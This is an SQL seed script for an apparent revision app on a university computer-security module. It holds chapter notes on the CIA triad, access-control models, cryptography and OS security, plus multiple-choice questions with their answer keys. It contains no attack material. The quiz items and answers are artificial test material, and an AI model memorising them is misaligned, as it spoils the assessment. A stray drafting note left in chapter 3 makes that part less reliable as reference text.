BEGIN TRANSACTION;
DELETE FROM questions;
DELETE FROM chapters;
DELETE FROM sqlite_sequence WHERE name IN ('chapters','questions');

INSERT INTO chapters (number, title, variant, content_md) VALUES (1, 'Introduction to Computer Security', 'standard', '**1. Overview**
This chapter provides a foundational understanding of computer security, focusing on the core principles, objectives, and mechanisms used to protect organisational assets. It is critical because it establishes the baseline vocabulary and frameworks—such as the CIA triad, threat classifications, and risk analysis—that will inform all subsequent technical and non-technical security strategies in your module.

**2. Key Terms**
*   **Security:** The protection of organisational assets (physical, software, data, intellectual property, and reputation).
*   **Policy:** Specifies what security objectives we want to achieve.
*   **Mechanism:** The methods and implementations used to enforce and fulfil security policies.
*   **Confidentiality:** Ensuring no information is inappropriately disclosed.
*   **Integrity:** Ensuring data has not been maliciously altered.
*   **Availability:** Ensuring data and services can be accessed when desired.
*   **Authentication:** Ensuring a user or data origin is properly identifiable.
*   **Authorisation:** The permission to do or have something.
*   **Accountability:** Ensuring actions are traceable to those responsible.
*   **Vulnerability:** A weakness of a system that can be exploited to damage assets.
*   **Threat:** A "potential" violation of security.
*   **Attack:** The actual violation of security exploiting a vulnerability.

**3. Processes & Models**
**Risk Analysis Process**
1. Identify the value of your **Assets**.
2. Identify system **Vulnerabilities**.
3. Identify potential **Threats**.
4. Calculate Risk using the function: `Risk = Assets x Vulnerabilities x Threats`.

**Security Life Cycle**
1. Identify **Threats**.
2. Define security **Policy**.
3. Create **Specification**.
4. **Design** the system.
5. **Implementation**.
6. **Operation & Maintenance** (which loops back to evaluating Threats).

**The Onion Model (Layered Security)**
*From innermost to outermost layer:*
1. **Hardware** security (tamper-resistant hardware modules).
2. **OS kernel** security (security models at the hardware abstraction level).
3. **Operating system** security (main OS security mechanisms).
4. **Services** security (security of services such as DNS, DHCP).
5. **Applications** security (application-level protection mechanisms).

**4. Most Examinable Points**
*   **You must know** the difference between a vulnerability (a weakness), a threat (a potential danger), and an attack (a deliberate act exploiting a vulnerability).
*   **You must know** the core elements of the CIA Triad: Confidentiality, Integrity, and Availability.
*   **You must know** the extended security objectives: Authentication and Accountability.
*   **You must know** the mathematical function for Risk: `Risk = Assets x Vulnerabilities x Threats`.
*   **You must know** the difference between Quantitative risk analysis (using mathematical domains like price/probability to calculate expected loss) and Qualitative risk analysis (ad-hoc advice from security experts without mathematical structure).
*   **You must know** the core Security Design Principles: Economy of mechanism (keep it simple), Fail-safe defaults (when in doubt, deny access), Open design (no "security by obscurity"), Separation of privilege, and Least privilege (minimum necessary access rights).
*   **You must know** the three security instrument stages: Prevention (by design), Detection (timely discovery), and Recovery/Reaction (restoring and upgrading).
*   **You must know** the four Classes of Threats: Disclosure (counters confidentiality), Deception (counters integrity), Disruption (counters integrity), and Usurpation (counters availability).
*   **You must know** the concept of Defense-in-Depth, which involves layered protection and the diversification of complementary products.
*   **You must know** the Security Quadrilema, which illustrates the constant trade-offs between Security, Cost, Functionality, and User expertise.

**5. Common Mistakes**
*   **Confusing Threats, Vulnerabilities, and Attacks:** Students often use these interchangeably. A vulnerability is the *flaw/weakness*, a threat is the *potential* danger to the asset, and an attack is the *actual execution*.
*   **Mixing up Policy and Mechanism:** Policy dictates *what* you want to achieve (the goal), while mechanism is *how* you implement it (the tool enforcing the goal).
*   **Ignoring the ''Human Factor'':** Students often focus entirely on hackers and technical exploits, forgetting that acts of human error (inexperience, improper training) are listed as "among the greatest threats" to organisational data.
*   **Misunderstanding Open Design:** Assuming security relies on keeping the system hidden. The slides explicitly state that Open Design means "no security by obscurity".');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What does the CIA triad stand for?', '["Confidentiality, Integrity, Availability","Confidentiality, Identity, Authorisation","Cryptography, Integrity, Authentication","Control, Identity, Access"]', 0, 'Confidentiality, Integrity, and Availability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Define "Accountability" in the context of computer security.', '["Users prove their identity","Actions are traceable to those responsible","Data is never altered","Information is never disclosed"]', 1, 'Actions are traceable to those responsible.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What is the mathematical formula for evaluating Risk?', '["Risk = Assets x Vulnerabilities x Threats","Risk = Vulnerabilities x Cost","Risk = Assets + Vulnerabilities","Risk = Threats - Controls"]', 0, 'Risk = Assets x Vulnerabilities x Threats.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Explain the difference between a Threat and a Vulnerability.', '["A threat is a weakness; a vulnerability is the actual attack","A vulnerability is an attack in progress; a threat is a flaw","A vulnerability is a weakness; a threat is a potential violation of security","They are identical terms"]', 2, 'A vulnerability is a weakness in the system, whereas a threat is a "potential" violation of security that represents a constant danger to an asset.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Which class of threat involves the "acceptance of false data," and which security service counters it?', '["Usurpation, countered by Authentication","Disruption, countered by Availability","Deception, countered by Integrity","Disclosure, countered by Confidentiality"]', 2, 'Deception; it is countered by Integrity services.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What does the "Fail-safe defaults" security design principle mean?', '["Always grant access unless explicitly denied","Never rely on obscurity","When in doubt, do not grant access","Keep the mechanism as simple as possible"]', 2, 'When in doubt, do not grant access.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Differentiate between Quantitative and Qualitative risk analysis.', '["Quantitative uses price and probability to compute expected loss; Qualitative uses ad-hoc expert advice","Quantitative ignores probability; Qualitative ignores cost","Both rely purely on mathematics","Quantitative uses expert opinion; Qualitative uses formulas"]', 0, 'Quantitative uses mathematical values (price and probability) to calculate an expected loss, while Qualitative relies on ad-hoc advice by security experts without a mathematical structure.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What are the three categories of security instruments/mechanisms mentioned in the system design lifecycle?', '["Design, Build, Operate","Policy, Mechanism, Audit","Identify, Protect, Respond","Prevention, Detection, Recovery/Reaction"]', 3, 'Prevention, Detection, and Recovery/Reaction.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'List the five layers of the "Onion Model" from the innermost layer to the outermost.', '["Applications, Services, OS, Kernel, Hardware","Hardware, OS Kernel, Operating System, Services, Applications","Kernel, Hardware, Services, OS, Applications","Hardware, Firmware, Network, OS, Users"]', 1, 'Hardware, OS Kernel, Operating System, Services, and Applications.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Your organisation implements SSL encryption on its web portal and monitors credit card statements for abnormal transactions. According to the slides, what level of instrument/mechanism (Non-technical, Semi-technical, or Technical) do these specific actions represent?', '["Semi-technical","Technical","Non-technical","Administrative"]', 0, 'Semi-technical instruments/mechanisms.');

INSERT INTO chapters (number, title, variant, content_md) VALUES (2, 'Information Security & Access Control', 'standard', '**1. Overview**
Chapter Two shifts from general security concepts to the specific mechanisms and theoretical models used to control system access. It covers the entire lifecycle of resource access—from identifying and authenticating a user, to authorising their actions, and logging those actions for accountability. This chapter matters because it bridges practical implementations (like passwords, biometrics, Kerberos, and Access Control Lists) with the rigorous, mathematical formal models (like Bell-LaPadula and Biba) that prove a system enforces its security policies without logical leaks.

**2. Key Terms**
*   **Information Security:** The process of protecting the confidentiality, integrity, availability, accountability, and privacy of information.
*   **Identification:** The process of establishing the identity of someone or something (asking "Who are you?").
*   **Authentication:** The process of verifying an established identity (demanding "Prove it!").
*   **Zero Knowledge Protocols:** Advanced authentication exchanges that provide absolutely no information to an adversarial impersonator.
*   **Single Sign-On (SSO):** Methods like Kerberos that automate distributed authentication, reducing the need to memorise and type multiple passwords.
*   **Subject:** An active entity (such as a user or process) that initiates an access request.
*   **Object:** A passive entity (such as a file or directory) to which access is requested.
*   **Reference Monitor:** An abstract mechanism that makes authorisation decisions and strictly mediates all access requests between subjects and objects.
*   **Discretionary Access Control (DAC):** An access control type where the resource owner dictates who has access rights and can transfer those rights to others.
*   **Mandatory Access Control (MAC):** Centralised access control where access rights are fixed strictly by administrators using system-wide policies.
*   **Role-Based Access Control (RBAC):** A logical layer that assigns access rights to specific roles rather than individual users.
*   **Conflict of Interest Class (COI):** In the Chinese Wall model, a grouping of datasets belonging to competing companies.

**3. Processes & Models**
**The Resource Access Sequence**
1. **Identification:** Determine which object/subject is requesting access to a resource.
2. **Authentication:** Verify that the object is indeed what it claims to be.
3. **Authorisation:** Verify if the object has the specific permission to access the resource.
4. **Accountability:** Log the transaction access for future auditing.

**Kerberos Ticket Request Process**
1. User logs in with a username and password, and the client hashes the password to use as a secret key.
2. Client sends a request with the user ID and requested service to the Authentication Server (AS).
3. The AS generates a Ticket-Granting Ticket (TGT) containing a session key, encrypts it, and sends it back to the client.
4. The client generates an authenticator and sends the TGT to the Ticket Granting Server (TGS).
5. The TGS verifies the authenticator, generates a Service Ticket with a new session key, and sends it encrypted to the client.
6. The client sends an authenticator and the Service Ticket to the actual Application Server to be granted access.

**Bell-LaPadula (BLP) Confidentiality Model**
1. **Simple Security Property (ss-Property):** "No reads up." A subject can read an object only if the subject''s clearance level is greater than or equal to the object''s classification.
2. **\*-Property (Star Property):** "No writes down." A subject can write to an object only if the subject''s clearance level is less than or equal to the object''s classification.

**Biba Integrity Model**
1. **Simple Integrity:** A subject can modify (write to) an object only if the subject''s integrity level is greater than or equal to the object''s.
2. **Integrity Confinement:** A subject can read an object only if the subject''s integrity level is less than or equal to the object''s.
3. **Invocation Property:** A subject can invoke another subject only if the first subject has an equal or higher integrity level.

**Chinese Wall Confidentiality Model**
1. **Simple Security Rule:** A subject can access an object only if the object is in the same company dataset as objects already accessed, or if it belongs to an entirely different conflict of interest class.
2. **\*-Property:** Write access is permitted only if the simple security rule is met, and the subject cannot read any unsanitised information in a different company dataset.

**4. Most Examinable Points**
*   **You must know** the three aspects that constantly contend with each other in information-hiding systems: Security, Robustness, and Capacity.
*   **You must know** the three categories of user authentication: something you know (passwords), something you have (smart cards), and something you are (biometrics).
*   **You must know** the difference between an Access Control List (ACL), which is an object-centred description of rights, and a Capability List (C-List), which is a subject-centred description.
*   **You must know** the three core requirements for implementing a Reference Monitor: Tamper-resistance, complete mediation (guaranteed invocation), and easiness of verification and testing.
*   **You must know** that the Bell-LaPadula model is designed solely to protect *confidentiality* and prevent information from flowing to lower clearance levels.
*   **You must know** that the Biba model is designed to protect *integrity* and prevent untrusted data alteration, acting essentially as Bell-LaPadula upside-down.
*   **You must know** that the Chinese Wall Policy is a hybrid model specifically designed to address conflicts of interest for consultants or contractors.
*   **You must know** that Chinese Wall permissions change dynamically based entirely on the history of the subject''s past accesses.

**5. Common Mistakes**
*   **Mixing up Bell-LaPadula and Biba rules:** Students famously reverse these. Remember: BLP protects *secrets* ("No Read Up, No Write Down"). Biba protects *trust/integrity* ("No Read Down, No Write Up").
*   **Confusing Identification and Authentication:** Identification is just stating a name (e.g. providing a username); Authentication is proving that the name is yours (e.g. providing the password).
*   **Misunderstanding MAC vs DAC:** Students often think DAC means access is "discretionary" for everyone. It means the *resource owner* uses their discretion to grant rights. MAC overrides the owner, forcing a centralised, administrator-controlled policy.
*   **Confusing ACLs and Capabilities:** Students forget which list belongs to what. An ACL is attached to the *file/object* (like a bouncer holding a guest list at a door). A Capability is attached to the *user/subject* (like a VIP pass in a user''s pocket).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'What are the three conflicting aspects of an information-hiding system?', '["Confidentiality, Integrity, Availability","Speed, Cost, Size","Security, Robustness, Capacity","Identification, Authentication, Authorisation"]', 2, 'Security, Robustness, and Capacity.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'Which category of user authentication does "signature dynamics" fall under?', '["Something you do once","Something you are (biometrics)","Something you have","Something you know"]', 1, '"Something you are" (Biometrics/behavioral characteristics).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'State the formula for the "Simple Security Property" (ss-Property) in the Bell-LaPadula model.', '["No reads up: read allowed only if object level <= subject clearance","No writes down: write allowed only if object level >= subject clearance","Read allowed only if levels are equal","No reads down: read allowed only if object level >= subject clearance"]', 0, '"No reads up." A subject can read an object only if the object''s security level is less than or equal to the subject''s clearance.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'What is the fundamental difference between Discretionary Access Control (DAC) and Mandatory Access Control (MAC)?', '["In DAC an administrator grants rights; in MAC the owner does","In DAC the resource owner grants rights; in MAC rights are fixed centrally by an administrator","DAC is for files only; MAC is for users only","Both are controlled solely by the owner"]', 1, 'In DAC, access control is carried out by the resource owner. In MAC, access rights are fixed centrally by an administrator via a system-wide policy.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'Which formal security model uses "Conflict of Interest" (COI) classes?', '["The Chinese Wall model","The Reference Monitor model","The Bell-LaPadula model","The Biba model"]', 0, 'The Chinese Wall model.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'Identify the three core requirements of a Reference Monitor.', '["Identification, authentication, accountability","Confidentiality, integrity, availability","Speed, simplicity, scalability","Tamper-resistance, complete mediation, easy verification"]', 3, 'Tamper-resistance, Complete mediation (guaranteed invocation), and Easiness of verification and testing.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'What is the primary vulnerability or downside of using a Capability List (C-List) instead of an ACL?', '["It exposes passwords in plaintext","Poor overview of rights per object and difficult revocation","It only works for a single user","It cannot authenticate users"]', 1, 'It offers a poor overview of access rights per object and makes revocation of rights difficult.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'In the Kerberos protocol, what is the purpose of the Ticket Granting Server (TGS)?', '["It hashes the user password into a key","It stores all user passwords","It verifies the TGT and issues a service ticket and session key for the application server","It encrypts the final application data"]', 2, 'The TGS verifies the client''s Ticket-Granting Ticket (TGT) and authenticator, and if valid, generates a specific service ticket and session key for the application server.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'State the Biba model''s rule regarding "writing" (modifying) an object.', '["Write is always denied","Write allowed only if levels are equal","Write allowed only if subject integrity <= object integrity","Simple integrity: write allowed only if subject integrity >= object integrity (no write up)"]', 3, 'Simple integrity: A subject can modify an object only if the subject''s integrity level is greater than or equal to the object''s integrity level ("No Write Up").');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'A contractor is hired to audit the networks of Domino''s and Pizza Hut, who are direct competitors. On her first day, she accesses a file on the Domino''s network. According to the slides, what formal security model dictates that she must now be permanently blocked from accessing any files on the Pizza Hut network, and why?', '["DAC: the owner revoked her access","Chinese Wall: permissions change with access history, blocking the competing dataset","Bell-LaPadula: she lacks clearance for Pizza Hut","Biba: Pizza Hut data has higher integrity"]', 1, 'The Chinese Wall model. It dictates this block to prevent a conflict of interest, as her permissions dynamically change based on her history of past accesses. Because she accessed data in one conflict of interest class (Domino''s), she is blocked from accessing data from a competing dataset (Pizza Hut) within the same class.');

INSERT INTO chapters (number, title, variant, content_md) VALUES (3, 'Cryptography', 'standard', '**1. Overview**
This chapter covers the evolution and mechanics of cryptography, bridging classical substitution and transposition methods with modern computational algorithms like DES, AES, and stream ciphers. It expands into the theoretical foundations of secrecy (Shannon''s principles), asymmetric (public-key) frameworks, cryptographic hash functions, and the Public Key Infrastructure (PKI) required to manage trust at scale. This matters because cryptography is the mathematical engine enabling core information security objectives: guaranteeing confidentiality, detecting malicious alterations (integrity), preventing spoofing (authentication), and ensuring users cannot deny their actions (non-repudiation).

**2. Key Terms**
*   **Cryptography:** The practice of hiding the *meaning* of a message, rather than its existence.
*   **Confusion:** Obscuring the statistical dependence between the encryption key and the cipher-text, often achieved via substitution.
*   **Diffusion:** Obscuring the statistical structure of the plaintext from the cipher-text, often achieved via transposition.
*   **Feistel Network:** A structural model for block ciphers that splits data into halves, using multiple rounds of substitution and permutation governed by sub-keys.
*   **S-Box (Substitution Box):** A complex, key-controlled substitution mechanism designed to introduce secure non-linearity into a cipher.
*   **Avalanche Effect:** A principle where a 1-bit difference in plaintext or key rapidly cascades into a large difference in cipher-text bits.
*   **Hash Function:** An algorithm that converts a large, variable-size input into a small, fixed-size output (digest).
*   **Digital Certificate:** An electronic document (following the X.509 standard) that binds an entity''s name to its public key, digitally signed by a trusted third party.
*   **Public Key Infrastructure (PKI):** The hardware, software, people, policies, and procedures needed to create, manage, store, distribute, and revoke digital certificates.
*   **Zero Knowledge Protocols:** (Though primarily in chapter 2, strongly related to modern auth) *Note: Not explicitly detailed in the Ch 3 slides beyond core asymmetric auth concepts.* 

**3. Processes & Models**
**Feistel Cipher Round Structure**
1. Split the plaintext block into a Left half ($L_i$) and Right half ($R_i$).
2. Pass the Left half directly down to become the new Right half: $L_{i+1} = R_i$.
3. Pass the Right half ($R_i$) and the sub-key ($K_i$) into the round function $F$.
4. XOR the output of the round function with the original Left half ($L_i$).
5. Set this XORed result as the new Right half: $R_{i+1} = L_i \oplus F(R_i, K_i)$. 
6. Repeat for $n$ rounds and combine $L_n$ and $R_n$ for the final cipher-text.

**DES One-Round Transformation**
1. **Expansion:** Expand the 32-bit right half ($R_{i-1}$) to 48 bits (duplicating some bits for the avalanche effect).
2. **Key Mixing:** XOR the expanded 48 bits with the 48-bit round key ($K_i$).
3. **Substitution:** Pass the result through 8 S-Boxes (converting 6-bit inputs into 4-bit outputs) to introduce non-linearity.
4. **Permutation:** Permute the resulting 32 bits using a P-Box.
5. **XOR:** XOR the permuted 32 bits with the left half ($L_{i-1}$) to create the new right half ($R_i$).

**Validating a Digital Signature**
1. Re-compute the hash value (digest) of the received original message.
2. Obtain the author’s public key from a trusted source/certificate.
3. Decrypt the attached digital signature using the author''s public key.
4. Compare the newly computed hash value with the decrypted hash value; if they match, the signature is valid.

**4. Most Examinable Points**
*   **You must know** that the *One Time Pad* is the only perfectly secure encryption algorithm because it uses a truly random key as long as the message, and the key is never reused.
*   **You must know** Shannon''s two cryptographic principles: *Confusion* (achieved via substitution to obscure key/cipher-text dependence) and *Diffusion* (achieved via transposition to obscure plaintext/cipher-text structure).
*   **You must know** the symmetric key distribution vulnerability known as the $N \times (N-1)/2$ problem; as the network grows, sharing unique secret keys between every pair of users becomes unmanageable.
*   **You must know** the three collision requirements for secure hash functions: First preimage resistance (hard to find a message from a given hash), Second preimage resistance (hard to find a second message matching a given message''s hash), and Collision resistance (hard to find *any* two messages with the same hash).
*   **You must know** that a digital signature provides *Data Integrity* (via the hash value) and *Non-repudiation* (via private key encryption), but it does *not* provide confidentiality.
*   **You must know** the difference between a Virus (needs a host file to propagate/execute) and a Worm (exploits network vulnerabilities to run and spread independently).
*   **You must know** that Advanced Encryption Standard (AES) is based on the *Rijndael* algorithm, which does *not* use a Feistel structure, but instead uses a state matrix with a non-linear layer, linear mixing layer, and key addition layer.
*   **You must know** that 3DES (Triple DES) was introduced because DES''s 56-bit key became too weak; 3DES operates by Encrypting, Decrypting, and Encrypting again, effectively using three 56-bit keys ($C = E_{k3}(D_{k2}(E_{k1}(P)))$).
*   **You must know** the components of PKI: Certification Authority (CA, issues and signs certificates), Registration Authority (RA, verifies identity), Subscribers, and the Repository/Archive (stores certificates and Certificate Revocation Lists).

**5. Common Mistakes**
*   **Confusing Confusion and Diffusion:** Students frequently mix these up. Remember: *Confusion* = Substitution (complex relationship between ciphertext and *key*). *Diffusion* = Transposition/Permutation (complex relationship between ciphertext and *plaintext*).
*   **Misunderstanding Digital Signatures:** Students often think a digital signature means encrypting the entire document with a private key. It does not. It only encrypts the *hash (digest)* of the document to save computational resources.
*   **Assuming Asymmetric is Always Better:** Students forget that asymmetric cryptography is highly computationally intensive (approx. 100x slower than symmetric). In practice, asymmetric is used to securely exchange a *symmetric session key*, which is then used to encrypt the actual data.
*   **Confusing Hash Preimage Resistances:** Second preimage resistance is about matching a *specific, existing* message''s hash. Collision resistance is the broader inability to find *any* two random messages that hash to the exact same value.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What does the "Avalanche effect" refer to in conventional cryptography?', '["Keys avalanche into smaller subkeys","A 1-bit change in plaintext or key produces large changes in the ciphertext","The ciphertext shrinks with each round","Plaintext statistics are preserved"]', 1, 'It is a diffusion property where a 1-bit difference in the plaintext or the key rapidly results in a large number of differences in the final cipher-text bits.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What are the two fundamental principles of secrecy design introduced by Claude Shannon?', '["Encryption and Decryption","Hashing and Salting","Confusion and Diffusion","Substitution and Addition"]', 2, 'Confusion and Diffusion.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'In a Feistel cipher, what mathematical operation is used to combine the Left half of the data with the output of the round function $F$?', '["XOR (Exclusive OR)","Bit rotation","Modular multiplication","AND"]', 0, 'XOR (Exclusive OR).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What is the key size and the number of keys used in standard 3DES?', '["Three 56-bit keys applied Encrypt-Decrypt-Encrypt","Three 128-bit keys","One 128-bit key","Two 64-bit keys"]', 0, 'Three 56-bit keys (for a total of 168 bits, though sometimes two are the same), applied in an Encrypt-Decrypt-Encrypt sequence.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Which specific algorithm was chosen by NIST to become the Advanced Encryption Standard (AES), and does it use a Feistel network?', '["DES; no Feistel network","Blowfish; yes, Feistel based","Rijndael; no, it does not use a Feistel network","Rijndael; yes, it uses a Feistel network"]', 2, 'The Rijndael algorithm. No, it does not use a Feistel structure; it uses a state matrix with non-linear, linear mixing, and key addition layers.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Define "Collision resistance" in the context of hash functions.', '["Infeasible to find a second message matching a given message hash","Infeasible to find any two distinct messages with the same hash","Infeasible to reverse a hash to its message","Infeasible to compute the hash at all"]', 1, 'It is the property that makes it computationally infeasible to find *any* two distinct messages ($M_1$ and $M_2$) that produce the exact same hash value ($h(M_1) = h(M_2)$).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What formula illustrates the scalability problem of symmetric key distribution?', '["N - 1","2^N","N x N","N x (N - 1) / 2"]', 3, '$N \times (N - 1) / 2$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Name the four main components of a Public Key Infrastructure (PKI).', '["Certification Authority, Registration Authority, Subscribers, Repository/Archive","Hash, Salt, Key, Certificate","CA, Firewall, VPN, IDS","Sender, Receiver, Key, Cipher"]', 0, 'Certification Authority (CA), Registration Authority (RA), Users/Subscribers, and Repository/Archive.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Explain the difference between a P-box and an S-box in block ciphers.', '["Both only permute bits","An S-box does key-controlled substitution (non-linearity); a P-box permutes bits","An S-box permutes bits; a P-box substitutes","Both only substitute values"]', 1, 'An S-box (Substitution box) performs complex, key-controlled substitutions to provide non-linearity. A P-box (Permutation box) performs block-wise permutations/scrambling of digits to provide maximum entropy.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Bob receives an email claiming to be from Alice, along with a digital signature. To verify the signature, Bob hashes the email and decrypts the signature. Which key must Bob use to decrypt the signature, and what two security guarantees does a successful match provide him?', '["Alice''s private key; confidentiality and integrity","Bob''s public key; authentication and confidentiality","A shared symmetric key; integrity only","Alice''s public key; it guarantees data integrity and non-repudiation"]', 3, 'Bob must use *Alice''s Public Key*. A successful match guarantees Data Integrity (the email wasn''t altered) and Non-repudiation/Authentication (Alice definitely sent it, as only her private key could have encrypted the matching hash).');

INSERT INTO chapters (number, title, variant, content_md) VALUES (4, 'Operating System Security', 'standard', '**1. Overview**
Chapter Four covers the security architectures, access control mechanisms, and fundamental design philosophies of the Windows and Linux/UNIX operating systems. It matters because it highlights the stark contrast between Windows’ highly granular, centrally managed security frameworks—such as Active Directory, Security Identifiers (SIDs), and Access Tokens—and UNIX’s historically modular approach that lacks a unified architecture and relies entirely on careful administration of user IDs and file permissions. Understanding these OS-level controls is essential for securing system resources against unauthorised access and preventing privilege escalation.

**2. Key Terms**
*   **Local Security Authority (LSA):** A Windows user-mode process responsible for password verification, access tokens, and audit logs (Slide 3/23).
*   **Security Accounts Manager (SAM):** The Windows database containing user accounts and encrypted passwords (Slide 3/23).
*   **Security Identifier (SID):** A unique, machine-generated code used to identify active entities (principals) in Windows security policies (Slide 9/23).
*   **Access Token:** A Windows credential container for a subject (process or thread) that holds identity SIDs, privileges, and default access rights (Slide 12/23).
*   **Active Directory:** A directory service in Windows used for the centralised organisation of system resources, users, security credentials, and trust management (Slide 6/23).
*   **UID / GID (User/Group Identifier):** 16-bit numbers used by UNIX to identify distinct users and groups (Slide 7/30).
*   **Inode:** A UNIX data structure that describes essential properties and access control rules for a specific resource or file (Slide 12/30).
*   **umask:** A UNIX command used to alter the default permissions of newly created files by specifying which bits to remove (Slide 17/30).
*   **SUID (Set User ID):** A Linux flag allowing a program to execute under the privilege of its owner, rather than the user calling it (Slide 20/30).
*   **Sticky Flag:** A Linux directory permission flag ensuring that only the owner of a file (or root) can remove files within that directory (Slide 20/30).

**3. Processes & Models**
**ACE (Access Control Entry) Processing Sequence (Windows)**
1. The system processes Access Control Entries sequentially within a Discretionary Access Control List (DACL).
2. Processing stops immediately if an entry explicitly *denies* the requested access rights.
3. Processing also stops if a set of entries explicitly *grants* all requested access rights.

**Effective Permission Calculation via umask (Linux)**
1. Identify the default permissions for the object (e.g., `777` for programs, `666` for files).
2. Identify the specified `umask` octal value (e.g., `022`).
3. Calculate the inverse of the mask using bitwise NOT (e.g., inverse of `022` is `755`).
4. Combine the default permission and the inverted mask to get the final resulting permissions (e.g., `777` combined with inverse `755` results in `755`).

**Object Security Descriptor Structure (Windows)**
1. **Owner SID:** Identifies the principal who holds ownership of the object.
2. **Primary Group SID:** Stored primarily for POSIX compatibility.
3. **DACL:** Specifies who is granted and who is denied access to the object.
4. **SACL:** Specifies the security audit policy for tracking access.

**4. Most Examinable Points**
*   **You must know** that UNIX inherently does *not* possess a unified security architecture; its security relies entirely on mechanisms that must be independently and correctly configured by an administrator.
*   **You must know** the difference between a Windows *Privilege* (which controls system-wide tasks like shutting down the system) and an *Access Right* (which dictates actions on specific objects like reading a file).
*   **You must know** the root user in Linux (UID 0) bypasses almost all access control mechanisms, and any user name can theoretically be mapped to UID 0 to grant root access.
*   **You must know** how to translate UNIX permissions between text (e.g., `rwxr-xr-x`) and octal (e.g., `755`) formats.
*   **You must know** the severe security risk of SUID programs; if ownership of a vulnerable SUID script is transferred to root, an attacker exploiting it automatically gains root privileges.
*   **You must know** the core components of Windows User Mode security: the Log-on process (winlogon), Local Security Authority (LSA), Security Accounts Manager (SAM), and User Account Control (UAC).
*   **You must know** that an Active Directory Domain Controller (DC) handles domain authentication, and they are typically replicated to prevent a single point of failure.
*   **You must know** the mapping of UNIX processes to UIDs: the *real* UID is always inherited from the parent process, while the *effective* UID can be inherited from the parent OR from the owner of the executed file if the SUID flag is set.

**5. Common Mistakes**
*   **Confusing Privileges and Access Rights in Windows:** Students frequently treat these interchangeably. Remember that Privileges are fixed system-wide rights (like locking a page in memory), while Access Rights are object-specific (like write access to a registry key).
*   **Miscalculating the Linux umask:** Students often subtract the mask as a normal decimal number. It acts as a bitwise filter; a default of `666` and a mask of `033` results in `644`, not `633`.
*   **Assuming SUID is a Defensive Security Measure:** Students sometimes assume SUID makes a system inherently secure by restricting execution rights. In reality, it is a functional tool that poses a massive risk of privilege escalation if applied carelessly to insecure scripts.
*   **Misunderstanding UNIX origins:** Assuming UNIX was built with high security in mind. Security was secondary to modularity, portability, and efficiency.');
